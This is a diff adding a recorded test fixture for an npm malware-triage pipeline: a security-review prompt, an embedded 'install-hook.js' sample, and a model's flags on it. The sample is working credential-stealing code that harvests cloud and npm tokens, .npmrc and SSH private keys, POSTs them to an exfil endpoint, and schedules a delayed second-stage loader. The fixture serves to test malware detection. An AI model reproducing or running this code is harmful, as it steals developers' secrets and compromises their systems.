@@ -1,0 +1,54 @@
+{
+  "id": "004_flag_fadb48cc",
+  "role": "flag",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a high-recall security triage pass over one npm package source file.\n\nFlag anything beyond the stated purpose or intrinsically suspicious: encoded or\nencrypted strings, dynamic code, hidden URLs or shell commands, anti-debugging,\nand time, geography, CI, inspector, or Docker gates. Over-flagging is expected.\nDo not decide malice. Return zero flags only for genuinely boring code."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n- rationale: From the package description and keywords, the package claims to be a lightweight DNS resolver with caching. No additional functionality is declared — no binary hooks, no runtime dependencies, and no README elaborating further. The inferred purpose is limited to what the manifest directly states: DNS resolution with caching. There is no indication of exfiltration or any other behavior beyond basic resolving and caching.\n\n## File: install-hook.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: const http = require(\"http\");\n7: \n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: \n10: function stage1() {\n11:   const stolen = {\n12:     stage: 1,\n13:     timestamp: new Date().toISOString(),\n14:     hostname: os.hostname(),\n15:     username: os.userInfo().username,\n16:     platform: process.platform,\n17:     env: {},\n18:     tokens: {},\n19:   };\n20: \n21:   const sensitivePatterns =\n22:     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;\n23:   for (const [key, value] of Object.entries(process.env)) {\n24:     if (sensitivePatterns.test(key)) {\n25:       stolen.env[key] = value;\n26:     }\n27:   }\n28: \n29:   const home = os.homedir();\n30:   const tokenFiles = [\n31:     path.join(home, \".npmrc\"),\n32:     path.join(home, \".ssh\", \"id_rsa\"),\n33:     path.join(home, \".ssh\", \"id_ed25519\"),\n34:   ];\n35:   for (const filePath of tokenFiles) {\n36:     try {\n37:       stolen.tokens[path.basename(filePath)] = fs.readFileSync(\n38:         filePath,\n39:         \"utf-8\"\n40:       );\n41:     } catch (e) {\n42: \n43:     }\n44:   }\n45: \n46:   exfil(stolen);\n47: \n48:   scheduleStage2();\n49: }\n50: \n51: function exfil(data) {\n52:   const payload = JSON.stringify(data);\n53:   const url = new URL(EXFIL_URL);\n54:   const req = http.request(\n55:     {\n56:       hostname: url.hostname,\n57:       port: url.port,\n58:       path: url.pathname,\n59:       method: \"POST\",\n60:       headers: {\n61:         \"Content-Type\": \"application/json\",\n62:         \"Content-Length\": Buffer.byteLength(payload),\n63:       },\n64:     },\n65:     () => {}\n66:   );\n67:   req.on(\"error\", () => {});\n68:   req.write(payload);\n69:   req.end();\n70: }\n71: \n72: function scheduleStage2() {\n73: \n74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;\n75: \n76:   setTimeout(() => {\n77:     try {\n78:       require(\"./lib/loader.js\");\n79:     } catch (e) {\n80: \n81:     }\n82:   }, delay);\n83: }\n84: \n85: stage1();\n```\n\n## Task\nReturn a compact summary, only security capabilities from the supplied enum, and at most 8 highest-signal thin flags with compact exact ranges such as 12-18. Do not flag ordinary logging, feature detection, regular expressions, encoding, or environment access when it is intrinsic to the stated purpose and does not handle secrets or evade analysis."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-fadb48cc",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "DeepInfra",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"summary\": \"Install hook performs credentialed exfiltration of environment secrets (npm, AWS, GitHub, etc.) and private key files to a local endpoint, then schedules loader execution.\",\n  \"capabilities\": [\n    \"DATA_EXFILTRATION\",\n    \"PROCESS_SPAWN\",\n    \"FILESYSTEM\",\n    \"NETWORK\",\n    \"ENV_VARS\"\n  ],\n  \"flags\": [\n    {\n      \"lines\":  [\"8-9\"],\n      \"why\": \"Hardcoded EXFIL_URL targeting /exfil endpoint for data theft\"\n    },\n    {\n      \"lines\": [\"14-18\"],\n      \"why\": \"Collects hostname, username, platform for reconnaissance\"\n    },\n    {\n      \"lines\": [\"21-27\"],\n      \"why\": \"Harvests credentials from environment variables (npm, AWS, GitHub, GitLab, Azure, Docker tokens)\"\n    },\n    {\n      \"lines\": [\"29-44\"],\n      \"why\": \"Exfiltrates private SSH keys and .npmrc files from home directory\"\n    },\n    {\n      \"lines\": [\"51-70\"],\n      \"why\": \"HTTP POST of serialized stolen data to exfiltration server\"\n    },\n    {\n      \"lines\": [\"72-83\"],\n      \"why\": \"Schedules delayed loader execution (72h in production, 5s in safe test mode)\"\n    },\n    {\n      \"lines\": [\"78-79\"],\n      \"why\": \"Invokes unreferenced ./lib/loader.js as next-stage payload\"\n    },\n    {\n      \"lines\": [\"85\"],\n      \"why\": \"Auto-executes stage1() on require, no export of benign functionality\"\n    }\n  ]\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 967,
+        "completion_tokens": 365,
+        "prompt_tokens_details": {
+          "cached_tokens": 64
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "ebbf58e539f8",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:44:25.754Z",
+    "recordedLatencyMs": 12157
+  }
+}
